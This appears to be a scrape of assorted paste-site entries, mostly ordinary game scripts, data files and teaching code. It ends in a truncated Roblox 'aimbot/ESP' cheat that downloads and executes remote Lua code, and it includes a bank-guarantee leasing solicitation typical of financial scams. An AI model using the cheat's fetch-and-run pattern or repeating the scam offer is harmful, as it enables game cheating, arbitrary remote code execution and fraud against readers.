    ""Jakarta"": 2,
    ""Beijing"": 59,
    ""\u014csaka"": 686,
    ""Lesser Poland"": 4,
    ""North West"": 51,
    ""Moscow"": 4,
    ""Chongqing"": 1,
    ""New Jersey"": 4,
    ""Vilnius"": 2,
    ""New York"": 55,
    ""Bangkok"": 1,
    ""Hanoi"": 1,
    ""Port Louis District"": 6,
    ""Central Singapore"": 686
  },
  ""country"": {
    ""China"": 64,
    ""Vietnam"": 2,
    ""United States"": 177,
    ""Germany"": 4,
    ""Lithuania"": 8,
    ""Singapore"": 738,
    ""The Netherlands"": 11,
    ""Japan"": 687,
    ""South Africa"": 2,
    ""United Kingdom"": 16,
    ""Indonesia"": 2,
    ""Poland"": 4,
    ""Russia"": 4,
    ""Thailand"": 1,
    ""Mauritius"": 6
  },
  ""account"": {
    ""hello"": 153,
    ""Administrator"": 211,
    ""Admin"": 210,
    ""Whatuptime.com"": 209,
    ""Jakartakini123#"": 210,
    ""Hello World"": 210,
    ""TinHocThucHanh"": 208,
    ""Hey"": 209,
    ""QXIovyKhm"": 1,
    ""joUXtI"": 1,
    ""jBPcgH"": 1,
    ""Domain"": 5,
    ""Test"": 14,
    ""Administr"": 16,
    ""exuVGhUtD"": 1,
    ""KVrwdf"": 1,
    ""YJdBFE"": 1,
    ""administrator"": 17,
    ""admin"": 17,
    ""whatuptile.com"": 14,
    ""(empty)"": 3,
    ""whatuptime.com"": 3,
    ""MEWDTnjEo"": 1,
    ""XcBZuV"": 1,
    ""XLyiOX"": 1,
    ""uws7pdsq"": 4,
    ""beio"": 1,
    ""ZKtxvjlwa"": 1,
    ""YObuBg"": 1,
    ""TFZpqT"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1726
  },
  ""client_build"": {
    ""Unknown"": 1726
  },
  ""client_name"": {
    ""Unknown"": 1726
  },
  ""ip_type"": {
    ""proxy"": 4,
    ""hosting"": 1607,
    ""Unknown"": 96,
    ""hosting & proxy"": 17,
    ""mobile"": 2
  }
}"
2f24PP1a,Projectile manager,AlewAlow,Lua,Thursday 2nd of May 2024 06:21:51 PM CDT,"local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local ServerScriptService = game:GetService(""ServerScriptService"")

local Container = require(ReplicatedStorage.Classes.Containers.Container)
local ContainerReceiver = require(ReplicatedStorage.Classes.ContainerReceiver)
local ContainerHolder = require(ReplicatedStorage.Classes.ContainerHolders.ContainerHolder)
local ReplicatedContainerHolder = require(ReplicatedStorage.Classes.ContainerHolders.ReplicatedContainerHolder)
local AllPlayerFilterer = require(ReplicatedStorage.Classes.PlayerFilterers.AllPlayerFilterer)

local DamageManager = require(ReplicatedStorage.Modules.DamageManager)

local Signal = require(ReplicatedStorage.Libs.Signal)

local ProjectileManager = {}

local IS_CLIENT = RunService:IsClient()

-- TODO: add curve function
ProjectileManager.ProjectileHit = Signal.new()
ProjectileManager.ProjectileDestroyed = Signal.new()

ProjectileManager.LastCFrames = {}
ProjectileManager.MoveFunctions = {}
ProjectileManager.DefaultProperties = {
	MoveType = ""Linear"",
	Lifetime = 0.7,
	HitRadius = 5,
	Damage = 5,
	
	Owner = nil,
	Object = nil,
	
	StartTime = nil,
	StartCFrame = nil,
	TargetCFrame = nil,
}

function ProjectileManager.MoveFunctions.Linear(startCFrame, targetCFrame, time)
	return startCFrame:Lerp(targetCFrame, time)
end

function ProjectileManager.MoveFunctions.Quadratic(startCFrame, targetCFrame, time)
	return startCFrame:Lerp(targetCFrame, 1 - math.pow(1 - time, 2))
end

function ProjectileManager.CreateProjectile(container)
	if not getmetatable(container) then
		container = Container.new(container)
	end
	
	for k, v in ProjectileManager.DefaultProperties do
		if container:GetValue(k) == nil then
			container:SetValue(k, v)
		end
	end
	
	if not container:GetValue(""StartTime"") then
		container:SetValue(""StartTime"", workspace:GetServerTimeNow())
	end
	
	if not container:GetValue(""RaycastParams"") then
		local params = RaycastParams.new()
		
		params.FilterDescendantsInstances = {
			container:GetValue(""Object""),
			container:GetValue(""Shooter"")
		}
		
		container:SetValue(""RaycastParams"", params)
	end
end

function ProjectileManager.AddProjectile(container)
	ProjectileManager.ProjectileContainerHolder:AddContainer(container.Object, container)
end

function ProjectileManager.DestroyProjectile(container)
	ProjectileManager.ProjectileDestroyed:Fire(container)
	ProjectileManager.ProjectileContainerHolder:RemoveContainer(container.Object)
end

if RunService:IsClient() then
	local CONTAINER_CONSTRUCTOR = function(key, data)
		return Container.new(data)
	end
	
	ProjectileManager.ProjectileContainerHolder = ContainerHolder.new()
	ProjectileManager.ProjectileContainerReceiver = ContainerReceiver.new(""Projectiles"", ProjectileManager.ProjectileContainerHolder, CONTAINER_CONSTRUCTOR)
else
	ProjectileManager.ProjectileContainerHolder = ReplicatedContainerHolder.new(""Projectiles"", ContainerHolder.new(), function(player)
		return AllPlayerFilterer.new()
	end)
end

RunService.Stepped:Connect(function()
	for _, container in ProjectileManager.ProjectileContainerHolder:GetAllContainers() do
		local timePassed = workspace:GetServerTimeNow() - container:GetValue(""StartTime"")
		local timePercentage = timePassed / container:GetValue(""Lifetime"")
		if timePercentage > 1 then
			ProjectileManager.DestroyProjectile(container)
			continue
		end
		
		local currentCFrame = ProjectileManager.MoveFunctions[container:GetValue(""MoveType"")](
			container:GetValue(""StartCFrame""),
			container:GetValue(""TargetCFrame""),
			timePercentage
		)
		
		local lastCFrame = ProjectileManager.LastCFrames[container] or currentCFrame
		local lastPosition = lastCFrame.Position
		local currentPosition = currentCFrame.Position
		local direction = currentPosition - lastPosition
		
		local result = workspace:Spherecast(
			lastPosition,
			container:GetValue(""HitRadius""),
			direction,
			container:GetValue(""RaycastParams"")
		)
		
		if result then
			ProjectileManager.DestroyProjectile(container)
			ProjectileManager.ProjectileHit:Fire(container, result)
			continue
		end
		
		if IS_CLIENT then
			container:GetValue(""Object"").CFrame = currentCFrame
		end
	end
end)

ProjectileManager.ProjectileHit:Connect(function(container, result)
	DamageManager.ApplyDamage(
		result.Instance,
		container:GetValue(""Damage""),
		container:GetValue(""Shooter"")
	)
end)


return ProjectileManager"
xrkY7bs7,hack rsa,WHO_IS_THIS_PSH_PSH,C++,Thursday 2nd of May 2024 05:54:44 PM CDT,"#include <iostream>
#include <cmath>
#include <vector>
using namespace std;


// Функция для проверки, является ли число простым
bool isPrime(int n) {
    if (n <= 1) return false;
    if (n <= 3) return true;
    if (n % 2 == 0 || n % 3 == 0) return false;
    for (int i = 5; i * i <= n; i += 6) {
        if (n % i == 0 || n % (i + 2) == 0) return false;
    }
    return true;
}


// Функция для вычисления наибольшего общего делителя двух чисел с использованием алгоритма Евклида
int calculateNOD(int a, int b, int& x, int& y) {
    if (b == 0) {
        x = 1;
        y = 0;
        return a;
    }
    int x1, y1;
    int d = calculateNOD(b, a % b, x1, y1);
    x = y1;
    y = x1 - (a / b) * y1;
    return d;
}

// Функция для вычисления модул обратного 'a' по модулю 'm'
int calculateModInverse(int a, int m) {
    int x, y;
    int gcd = calculateNOD(a, m, x, y);
    if (gcd != 1) {
        throw runtime_error(""Обратное значение не существует"");
    }
    else {
        return (x % m + m) % m;
    }
}

// Функция для генерации открытого и закрытого ключей для шифрования RSA
void generateRSAKeys(int prime1, int prime2, int& publicKeyExponent, int& privateKeyExponent, int& modulus) {
    modulus = prime1 * prime2;
    int phi = (prime1 - 1) * (prime2 - 1);
    // Выбор открытого экспонента 'e'
    publicKeyExponent = 2; // Начинаем с общего выбора для e
    int x, y; // переменные для расширенного алгоритма Евклида
    while (calculateNOD(publicKeyExponent, phi, x, y) != 1) {
        publicKeyExponent++;
    }
    // Вычисление закрытого экспонента 'd' как модул обратного 'e'
    privateKeyExponent = calculateModInverse(publicKeyExponent, phi);
}

// Функция для шифрования сообщения с использованием открытого ключа (e, n)
int encrypt(int message, int publicKeyExponent, int modulus) {
    int result = 1;
    for (int i = 0; i < publicKeyExponent; i++) {
        result = (result * message) % modulus;
    }
    return result;
}

// Функция для дешифрования с использованием закрытого ключа (d, n)
int decrypt(int ciphertext, int privateKeyExponent, int modulus) {
    int result = 1;
    for (int i = 0; i < privateKeyExponent; i++) {
        result = (result * ciphertext) % modulus;
    }
    return result;
}


// Функция для факторизации числа
void factorize(int n, int ciphertext, int publicKeyExponent) {
    for (int i = 2; i <= n / 2; i++) {
        if (n % i == 0 && isPrime(i) && isPrime(n / i)) {
            //с помощью них можем попробовать узнать приватный ключ
            cout << ""Множители модуля, которые мы узнали с помощью факторизации: "" << i << "" и "" << n / i << endl<<endl;
            // Здесь вычисляем закрытый ключ
            int prime1 = i;
            int prime2 = n / i;
            int modulus = prime1 * prime2;
            int phi = (prime1 - 1) * (prime2 - 1);
            int x, y;
            int privateKeyExponent = calculateModInverse(publicKeyExponent, phi);

            //
            cout << ""Предполагаемый закрытый ключ (исходя из метода факторизации): {"" << privateKeyExponent << "", "" << modulus << ""}"" << std::endl;
            //
            cout << ""Предполагаемое дешифрованное сообщение: "" << decrypt(ciphertext, privateKeyExponent, modulus) << endl;
            return;
        }
    }
    cout << ""Не удалось выполнить факторизацию."" << std::endl;
}

int main() {
    setlocale(LC_ALL, ""Russian"");
    // два простых числа
    int prime1 = 11;
    int prime2 = 13;
    int modulus, publicKeyExponent, privateKeyExponent;

    // Генерируем открытый и закрытый ключи для шифрования RSA
    generateRSAKeys(prime1, prime2, publicKeyExponent, privateKeyExponent, modulus);

    cout << ""Открытый ключ: {"" << publicKeyExponent << "", "" << modulus << ""}"" << endl;

    cout << ""Закрытый ключ: {"" << privateKeyExponent << "", "" << modulus << ""}"" << endl;

    // сообщение для шифрования, оно должно быть меньше 143(тк есть зависимость от модуля)для других чисел-другие ограничения
    int message = 141;
    // Шифруем сообщение
    int ciphertext = encrypt(message, publicKeyExponent, modulus);
    // Дешифруем
    int decryptedMessage = decrypt(ciphertext, privateKeyExponent, modulus);

    // Выводим исходное сообщение
    cout << ""Исходное сообщение: "" << message << endl<<endl;
    factorize(modulus, ciphertext, publicKeyExponent);

    // Выводим зашифрованное сообщение
    cout <<endl<< ""Зашифрованное сообщение: "" << ciphertext << endl;
    // Выводим дешифрованное сообщение
    cout << ""Дешифрованное сообщение: "" << decryptedMessage << endl;

    return 0;
}
"
Msy6ZQ5f,Untitled,opless,Bash,Thursday 2nd of May 2024 05:50:40 PM CDT,"cpu% cd ../jl
cpu% mk
6c -FTVw -. -I. asm.c
6c -FTVw -. -I. compress.c
6c -FTVw -. -I. list.c
6c -FTVw -. -I. noop.c
6c -FTVw -. -I. obj.c
asm.c:138 name not declared: B_MAGIC
asm.c:138 name not declared: Y_MAGIC
6c -FTVw -. -I. optab.c
mk: 6c -FTVw -. ...  : exit status=rc 237750: 6c 237752: error"
VYJ4iEKE,TurtleGoldCoinSorter,nauseant,Lua,Thursday 2nd of May 2024 05:46:25 PM CDT,"function startingFace()
    local success, data = turtle.inspect()
    if success  == true and data.name ~= ""thermal:machine_press"" then
        turtle.turnLeft()
        startingFace()
    end
end

function swapStorage()
    local coin = turtle.getItemCount()
    if coin >= 1 then
        turtle.drop()
        turtle.turnLeft()
    else
        turtle.suckDown()
        swapStorage()
    end
end

function main()
    turtle.turnLeft()
    swapStorage()
end

startingFace()
while true do
    main()
end"
jXUzukxZ,Untitled,emveepee,JSON,Thursday 2nd of May 2024 05:35:27 PM CDT,"{
       ""contentRating"": [
            {
                ""body"": ""USA Parental Rating"",
                ""code"": ""TVPG"",
                ""country"": ""USA""
            },
            {
                ""body"": ""Freiwillige Selbstkontrolle Fernsehen"",
                ""code"": ""6"",
                ""country"": ""DEU""
            },
            {
                ""body"": ""Australian Classification Board"",
                ""code"": ""PG"",
                ""country"": ""AUS""
            },
            {
                ""body"": ""Canadian Parental Rating"",
                ""code"": ""PG"",
                ""country"": ""CAN""
            },
            {
                ""body"": ""Régie du cinéma"",
                ""code"": ""8+"",
                ""country"": ""CAN""
            },
            {
                ""body"": ""Mediakasvatus- ja kuvaohjelmayksikkö"",
                ""code"": ""S"",
                ""country"": ""FIN""
            },
            {
                ""body"": ""Krajowa Rada Radiofonii i Telewizji"",
                ""code"": ""12"",
                ""country"": ""POL""
            },
            {
                ""body"": ""Freiwillige Selbstkontrolle der Filmwirtschaft"",
                ""code"": ""0"",
                ""country"": ""DEU""
            },
            {
                ""body"": ""Departamento de Justiça, Classificação, Títulos e Qualificação"",
                ""code"": ""12"",
                ""country"": ""BRA"",
                ""contentWarning"": [
                    ""Linguagem Imprópria"",
                    ""Drogas Lícitas""
                ]
            },
            {
                ""body"": ""Medierådet"",
                ""code"": ""A"",
                ""country"": ""DNK""
            }
        ]
}"
BazEucTS,Untitled,emveepee,JSON,Thursday 2nd of May 2024 05:13:29 PM CDT,"{
       ""contentAdvisory"": [
            ""Adult Language"",
            ""Adult Situations"",
            ""Violence""
        ],
        ""contentRating"": [
            {
                ""body"": ""Motion Picture Association"",
                ""code"": ""PG-13"",
                ""country"": ""USA"",
                ""contentWarning"": [
                    ""Language"",
                    ""A Scene of Sensuality"",
                    ""Sports Action Violence""
                ]
            },
            {
                ""body"": ""B.C. Film Classification Office"",
                ""code"": ""PG"",
                ""country"": ""CAN"",
                ""contentWarning"": [
                    ""Violence"",
                    ""Coarse Language""
                ]
            },
            {
                ""body"": ""Saskatchewan Film and Video Classification Board"",
                ""code"": ""PG"",
                ""country"": ""CAN"",
                ""contentWarning"": [
                    ""Coarse Language"",
                    ""Violence""
                ]
            },
            {
                ""body"": ""Manitoba Film Classification Board"",
                ""code"": ""PG"",
                ""country"": ""CAN"",
                ""contentWarning"": [
                    ""Coarse Language"",
                    ""Violence""
                ]
            },
            {
                ""body"": ""Alberta's Film Classification Board"",
                ""code"": ""PG"",
                ""country"": ""CAN"",
                ""contentWarning"": [
                    ""Violence""
                ]
            },
            {
                ""body"": ""Régie du cinéma"",
                ""code"": ""G"",
                ""country"": ""CAN"",
                ""contentWarning"": [
                    ""Not Rec. for Young Children""
                ]
            },
            {
                ""body"": ""Dirección General de Radio, Televisión y Cinematografía"",
                ""code"": ""B"",
                ""country"": ""MEX""
            },
            {
                ""body"": ""Departamento de Justiça, Classificação, Títulos e Qualificação"",
                ""code"": ""12"",
                ""country"": ""BRA"",
                ""contentWarning"": [
                    ""Violência""
                ]
            },
            {
                ""body"": ""Freiwillige Selbstkontrolle der Filmwirtschaft"",
                ""code"": ""12"",
                ""country"": ""DEU""
            },
            {
                ""body"": ""Statens medieråd"",
                ""code"": ""Från 11 år"",
                ""country"": ""SWE""
            },
            {
                ""body"": ""Mediakasvatus- ja kuvaohjelmayksikkö"",
                ""code"": ""K16"",
                ""country"": ""FIN""
            },
            {
                ""body"": ""Medietilsynet"",
                ""code"": ""12 år"",
                ""country"": ""NOR""
            },
            {
                ""body"": ""Consejo de Calificación Cinematográfica"",
                ""code"": ""14"",
                ""country"": ""CHL""
            },
            {
                ""body"": ""Arcom"",
                ""code"": ""-10"",
                ""country"": ""FRA""
            },
            {
                ""body"": ""Australian Classification Board"",
                ""code"": ""M"",
                ""country"": ""AUS""
            },
            {
                ""body"": ""映倫"",
                ""code"": ""G"",
                ""country"": ""JPN""
            },
            {
                ""body"": ""Medierådet"",
                ""code"": ""11"",
                ""country"": ""DNK""
            },
            {
                ""body"": ""British Board of Film Classification"",
                ""code"": ""12"",
                ""country"": ""GBR""
            },
            {
                ""body"": ""Kijkwijzer"",
                ""code"": ""12"",
                ""country"": ""NLD"",
                ""contentWarning"": [
                    ""Violence"",
                    ""Coarse Language"",
                    ""Fear""
                ]
            },
            {
                ""body"": ""Krajowa Rada Radiofonii i Telewizji"",
                ""code"": ""12"",
                ""country"": ""POL""
            },
            {
                ""body"": ""영상물등급위원회"",
                ""code"": ""12+"",
                ""country"": ""KOR""
            }
        ]
}"
eSC78a4L,Untitled,sissou123,C,Thursday 2nd of May 2024 05:06:45 PM CDT,"C Programming Bootcamp - The Complete C Language Course
C Programming 2024: Master the Fundamentals of C Programming Language. Join the Comprehensive C Bootcamp Masterclass! 
What you'll learn
Fundamentals of Programming
Summarised & Concise Material [Saving TONS of Time!]
OVER 100 Practical Exercises! 
for more:https://cuty.io/hJda75Y13zR
"
0Xy0AkKx,inventory,AlewAlow,Lua,Thursday 2nd of May 2024 03:53:00 PM CDT,"local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local ServerScriptService = game:GetService(""ServerScriptService"")

local ContainerUtil = require(ReplicatedStorage.Shared.Utils.ContainerUtil)
local DataManagerShared = require(ReplicatedStorage.Shared.Modules.DataManagerShared)
local InventoryManagerShared = require(ReplicatedStorage.Shared.Modules.InventoryManagerShared)
local InventoryManager = {}

function InventoryManager.InsertItem(playerContainer, itemData, amountToGive)
	if type(itemData) == ""string"" then
		itemData = InventoryManagerShared.Items[itemData]
	end
	
	local amountLeft = amountToGive
	while amountLeft > 0 do
		local itemSizeCount = 0
		
		for _, otherItemSlot in playerContainer:GetValue(""Items"") do
			local otherItemData = InventoryManagerShared.Items[otherItemSlot.Key]
			if not otherItemData then
				continue
			end
			
			if otherItemData.Size == itemData.Size then
				itemSizeCount += otherItemSlot.Amount
			end
		end
		
		if itemSizeCount >= InventoryManagerShared.Sizes[itemData.Size] then
			break
		end
		
		local itemSlot
		local itemSlotIndex

		for i, otherItemSlot in playerContainer:GetValue(""Items"") do
			local otherItemData = InventoryManagerShared.Items[otherItemSlot.Key]
			if not otherItemData then
				continue
			end

			if otherItemData.Size ~= itemData.Size or
				otherItemSlot.Key ~= itemData.Key
			then
				continue
			end
			
			if itemData.Stack and otherItemSlot.Amount >= itemData.Stack then
				continue
			end

			itemSlot = otherItemSlot
			itemSlotIndex = i
		end
		
		if not itemSlot then
			itemSlotIndex = #playerContainer:GetValue(""Items"") + 1
			itemSlot = {
				Key = itemData.Key,
				Amount = 0,
			}

			ContainerUtil.InsertToTable(playerContainer, {""Items""}, itemSlot)
		end
		
		local stackSize = itemData.Stack or InventoryManagerShared.Sizes[itemData.Size]
		local amountToAdd = math.min(stackSize - itemSlot.Amount, amountLeft)
		amountLeft -= amountToAdd
		playerContainer:SetValue({""Items"", itemSlotIndex, ""Amount""}, itemSlot.Amount + amountToAdd)
	end
	
	return amountToGive - amountLeft
end

DataManagerShared.PlayerContainerHolder.ContainerAdded:Connect(function(player, playerContainer)
	while true do
		task.wait(3)
		
		local index = math.random(1, #InventoryManagerShared.Items)
		local key = InventoryManagerShared.Items:GetKeyByIndex(index)
		local data = InventoryManagerShared.Items[key]
		
		InventoryManager.InsertItem(playerContainer, data, 5)
		print(playerContainer)
	end
end)

return InventoryManager"
KicC8SkE,Minecraft Turtle stairDown,hornedcommando,Lua,Thursday 2nd of May 2024 02:46:57 PM CDT,"--Desc: A turtle program which attempts to stair down through blocks, number of stairs defined by the user
-- Useful for making mineshafts or traversing the nether
--By: hornedcommando and BadPunBananas
 
--TODO: currently it is hardcoded to only place dirtblocks, should be updated to a dict with at least cobble and netherack
 

local function input()
    while true do
        write(""How Many Stairs?\n"")
        size = tonumber(read())
        break
    end
end

local function isForbiddenBlock(blockName)
    local forbiddenBlocks = {
        ""forbidden_arcanus:stella_arcanum"",
        ""minecraft:bedrock""
    }
    for _, forbiddenBlock in ipairs(forbiddenBlocks) do
        if blockName == forbiddenBlock then
            return true
        end
    end
    return false
end

function searchInventory(name)
    for slot = 1, 16 do
        turtle.select(slot)
        local slotDetail = turtle.getItemDetail()
        if slotDetail and slotDetail.name:find(name) then
            return slot -- Return the slot number if item found
        end
    end
    return nil -- Return nil if item not found
end

function fill(name)
    local found, slot = searchInventory(name)
    if found then
        turtle.placeDown()  -- Place the block
        print(""Placed block:"", name)
    else
        print(""Block not found:"", name)
    end
end

--Function to refuel the turtle, attempts to maintain a specified fuel level, this could be adjusted based on abundance of fuel or time between fuel calls
local function smartRefuel()
    print(""Checking Fuel"")
    -- Check if fuel level is below 1000
    while turtle.getFuelLevel() < 1000 do
        print(""Refueling"")
        for slot = 1, 16 do
            turtle.select(slot) -- Select the slot
            if turtle.refuel(0) then
                -- Check if the selected item is a fuel
                turtle.refuel(1) -- Refuel with the selected item
                break -- Stop searching for fuel after refueling
            end
        end
    end
end

function gd()
    print(""Going down"")
    local success, block = turtle.inspectDown()
    if isForbiddenBlock(block.name) then
        print(""Detected block is forbidden"")
        return false
    else
        local success, block = turtle.inspectUp()
        if isForbiddenBlock(block.name) then
            print(""Detected block is forbidden"")
            return false
        else
            turtle.digUp()
            while not turtle.down() do
                print(""Digging down"")
                turtle.digDown()
            end
            if not turtle.inspectDown() then
                fill(""minecraft:dirt"")
            end
            return true
        end
    end

end

function gf()
    print(""Going forward"")
    local success, block = turtle.inspect()
    if isForbiddenBlock(block.name) then
        print(""Detected block is forbidden"")
        return false
    else
        while not turtle.forward() do
            print(""Digging forward"")
            turtle.dig()
        end
    end
end

function stairDown()
    for i = 1, size do
        gd()
        gf()
    end
end

input()
smartRefuel()
stairDown()"
zJwBiQM3,Minecraft Turtle stairUp,hornedcommando,Lua,Thursday 2nd of May 2024 02:43:08 PM CDT,"--Desc: A turtle program which attempts to stair up through blocks, number of stairs defined by the user
-- Useful for making exits to mineshafts or traversing the nether
--By: hornedcommando and BadPunBananas

--TODO: currently it is hardcoded to only place dirtblocks, should be updated to a dict with at least cobble and netherack

local function input()
    while true do
        write(""How Many Stairs?\n"")
        size = tonumber(read())
        break
    end
end

local function isForbiddenBlock(blockName)
    local forbiddenBlocks = {
        ""forbidden_arcanus:stella_arcanum"",
        ""minecraft:bedrock""
    }
    for _, forbiddenBlock in ipairs(forbiddenBlocks) do
        if blockName == forbiddenBlock then
            return true
        end
    end
    return false
end

function searchInventory(name)
    for slot = 1, 16 do
        turtle.select(slot)
        local slotDetail = turtle.getItemDetail()
        if slotDetail and slotDetail.name:find(name) then
            return slot -- Return the slot number if item found
        end
    end
    return nil -- Return nil if item not found
end

function fill(name)
    local found, slot = searchInventory(name)
    if found then
        turtle.placeDown()  -- Place the block
        print(""Placed block:"", name)
    else
        print(""Block not found:"", name)
    end
end

--Function to refuel the turtle, attempts to maintain a specified fuel level, this could be adjusted based on abundance of fuel or time between fuel calls
local function smartRefuel()
    print(""Checking Fuel"")
    -- Check if fuel level is below 1000
    while turtle.getFuelLevel() < 1000 do
        print(""Refueling"")
        for slot = 1, 16 do
            turtle.select(slot) -- Select the slot
            if turtle.refuel(0) then
                -- Check if the selected item is a fuel
                turtle.refuel(1) -- Refuel with the selected item
                break -- Stop searching for fuel after refueling
            end
        end
    end
end

function gu()
    print(""Going up"")
    local success, block = turtle.inspectDown()
    if isForbiddenBlock(block.name) then
        print(""Detected block is forbidden"")
        return false
    else
        local success, block = turtle.inspectUp()
        if isForbiddenBlock(block.name) then
            print(""Detected block is forbidden"")
            return false
        else
            turtle.digUp()
            while not turtle.up() do
                print(""Digging up"")
                turtle.digUp()
            end
            turtle.digUp()
            return true
        end
    end

end

function gf()
    print(""Going forward"")
    local success, block = turtle.inspect()
    if isForbiddenBlock(block.name) then
        print(""Detected block is forbidden"")
        return false
    else
        while not turtle.forward() do
            print(""Digging forward"")
            turtle.dig()
        end
        if not turtle.inspectDown() then
            fill(""minecraft:dirt"")
        end
    end
end

function stair()
    for i = 1, size do
        gu()
        gf()
    end
end

input()
smartRefuel()
stair()"
XeFu5v1n,Algoritmi lezione 22 - ricerca binaria,fcamuso,C#,Thursday 2nd of May 2024 02:41:14 PM CDT,"#include <iostream>
#include <fstream>

#include <chrono>

using namespace std;

const int MAX_PAROLE = 500000;
const int MAX_CERCATE = 10000;

string vocabolario[MAX_PAROLE];
string da_cercare[MAX_CERCATE];

enum Stato {START, STOP};
auto Cronometro(Stato stato = Stato::START)
{
  static std::chrono::time_point<std::chrono::system_clock> inizio;
  static std::chrono::time_point<std::chrono::system_clock> fine;

  if (stato == Stato::START)
  {
    inizio = chrono::high_resolution_clock::now();
    fine = inizio;
  }
  else
    fine = chrono::high_resolution_clock::now();


  return chrono::duration_cast<std::chrono::milliseconds>(fine - inizio).count();
}

int leggi_file(string path_file, string v[], int capienza_vettore)
{
 //per leggere useremo un I-nput F-ile STREAM = IFSTREAM
  ifstream leggi(path_file); //il cosiddetto file handle (riferimento al file su disco)

  //test per successo apertura
  if (!leggi)
    throw runtime_error(""File non trovato\n"");

  //lettura una intera riga alla volta
  string riga="""";

  //getline restituisce false quando le righe sono finite
  int conta_righe = 0;
  while ( getline(leggi, riga) )
  {
    if (conta_righe>=capienza_vettore)
      throw runtime_error(""Capienza vettore insufficiente\n"");

    v[conta_righe] = riga;
    conta_righe++;
  }

  leggi.close(); leggi.clear();

  return conta_righe;

}

int partiziona(string v[], int inizio, int fine)
{
	string pivot = v[inizio];

	int cont = 0;
	for (int i = inizio + 1; i <= fine; i++) {
		if (v[i] <= pivot)
			cont++;
	}

	//mettiamo il pivot nella posizione che gli spetta
	int indice_pivot = inizio + cont;
	swap(v[indice_pivot], v[inizio]);


	// spostiamo gli elementi più piccoli del pivot alla sua sinistra
	// e quelli più grandi alla sua destra
	int i = inizio, j = fine;

	while (i < indice_pivot && j > indice_pivot) {

		while (v[i] <= pivot) {
			i++;
		}

		while (v[j] > pivot) {
			j--;
		}

		if (i < indice_pivot && j > indice_pivot) {
			swap(v[i], v[j]);
			i++; j--;
		}
	}
	//cout << string(40, '-') << ""\n\n"";

	return indice_pivot;
}

void quickSort(string v[], int inizio, int fine)
{

	if (inizio >= fine)
		return;


	int p = partiziona(v, inizio, fine);

  //tail recursion
  // ordina la parte a sinistra
	quickSort(v, inizio, p - 1);

	// ordina la parte a destra
	quickSort(v, p + 1, fine);

}

int ricerca_sequenziale(string cercata, string v[], int num_ele)
{
  for (int i=0; i<num_ele; i++)
    if (cercata==v[i]) return i;

  return -1;
}

int ricerca_binaria(string cercata, string v[], int num_stringhe)
{
   int inizio = 0;
   int fine = num_stringhe - 1;
   int pos_trovata = -1;

   while (inizio<=fine && pos_trovata==-1)
   {
     int mediano = (inizio+fine)/2;

     if (v[mediano] == cercata)
      pos_trovata=mediano;
     else
       if (v[mediano]<cercata)
         inizio = mediano+1;
       else
        fine = mediano - 1;
   }

   return pos_trovata;
}

int main()
{
  //quante parole contiene il dizionario? 481.816
  int numero_parole_vocabolario = leggi_file(""vocabolario3.txt"", vocabolario, MAX_PAROLE);


  //scegliamo tra queste 100000 parole da far poi cercare
  //(ammesse ripetizioni della stessa ricerca)
  for (int i=0; i<MAX_CERCATE; i++)
    da_cercare[i] = vocabolario[(rand()*rand()) % numero_parole_vocabolario];

  //sequenziale
  Cronometro(Stato::START);

  for (int i=0; i<MAX_CERCATE; i++)
    ricerca_sequenziale(da_cercare[i], vocabolario, numero_parole_vocabolario);

  cout << ""Tempo ricerca sequenziale: "" << Cronometro(Stato::STOP) <<""ms\n"";

   //binaria
  Cronometro(Stato::START);

  for (int i=0; i<MAX_CERCATE; i++)
    ricerca_binaria(da_cercare[i], vocabolario, numero_parole_vocabolario);

  cout << ""Tempo ricerca binaria: "" << Cronometro(Stato::STOP) <<""ms\n"";


    return 0;
}


"
C3cjNXa5,We are direct provider for BG/SBLC specifically for lease/sales,rsileaseconsult,C,Thursday 2nd of May 2024 02:29:36 PM CDT,"We are project funder as well as financial lender. We have BG/SBLC specifically for BUY/LEASE at a leasing price of 3+(0.5%+X) of face value Issuance by HSBC London and many other 25 top AA rated Bank in Europe, Middle East or USA. We also secure funding. Also We are into the provision of short term and long term business/personal loans for both small and large scale business funds.

* FOR LEASING OF BG/SBLC
MINIMUM FACE VALUE OF BG/SBLC = EUR/USD 1M
LEASING FEE = 3+(0.5%+X)

* FOR PURCHASE OF FRESH CUT BG/SBLC
PRICE = 32%+2%
MINIMUM FACE VALUE OF BG/SBLC = EUR/USD 1M

Kindly contact us for our procedures and be sure that we shall respond within 24hrs maximum.

Intermediaries/Consultants/Brokers are welcome to bring their clients and are 100% protected. In complete confidence, we will work together for the benefits of all parties involved.

Awaiting your response.
Best regards,
RAMESH SUBRAMANIAM IYER  
Contact: rsi.leaseconsult@gmail.com
Skype ID: rsi.leaseconsult"
Jr7Vb4dx,Roblox Aimbot script/ESP PANDORA.CC #1 CHEAT,MrScripter2,Bash,Thursday 2nd of May 2024 01:42:47 PM CDT,"local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = ""Pandora.cc"",
    LoadingTitle = ""Loading . . . PANDORA INJECTED"",
    LoadingSubtitle = ""By OnYx/Chunk"",
    ConfigurationSaving = {
       Enabled = false,
       FolderName = nil,
       FileName = ""Pandora.cc""
    },
    Discord = {
       Enabled = false,
       Invite = ""noinvitelink"",
       RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
       Title = ""Untitled"",
       Subtitle = ""Key System"",
       Note = ""No method of obtaining the key is provided"",
       FileName = ""Key"",
       SaveKey = true,
       GrabKeyFromSite = false,
       Key = {""Hello""}
    }
 })

 local MainTab = Window:CreateTab(""🔫 Aimbot 🔫"", nill)
 local MainSection = MainTab:CreateSection(""Main"")

 Rayfield:Notify({
    Title = ""Executed Pandora.cc"",
    Content = ""Have Fun with Pandora.cc"",
    Duration = 2.5,
    Image = nill,
    Actions = {
       Ignore = {
          Name = ""I will sub"",
          Callback = function()
          print(""The user tapped I will sub"")
       end
    },
 },
 })

 local Button = MainTab:CreateButton({
    Name = ""Aimbot"",
    Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script%20(Without%20FOV).lua""))()
    end,
 })

 local Button = MainTab:CreateButton({
    Name = ""ESP"",
    Callback = function()
        local Holder = Instance.new(""Folder"", game.CoreGui)
Holder.Name = ""ESP""

local Box = Instance.new(""BoxHandleAdornment"")
Box.Name = ""nilBox""
